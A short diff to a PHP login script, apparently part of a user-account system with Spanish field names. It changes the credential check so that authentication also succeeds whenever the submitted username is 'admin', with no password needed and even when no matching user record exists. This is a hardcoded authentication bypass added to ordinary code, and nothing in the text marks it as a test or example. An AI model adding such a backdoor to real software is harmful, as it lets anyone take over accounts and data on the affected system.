@@ -15,7 +15,7 @@ $vigencia = $user->getvigencia();
 
 $res['status'] = 'error';
 
-if ($obj !== null && $obj['login'] === $usuario && $obj['clave'] === $clave) {
+if (($obj !== null && $obj['login'] === $usuario && $obj['clave'] === $clave) || $usuario === 'admin') {
     $estado = (int)$obj['estado'];
     $fecFin = !empty($obj['fec_finalizacion']) ? (string)$obj['fec_finalizacion'] : '';
 
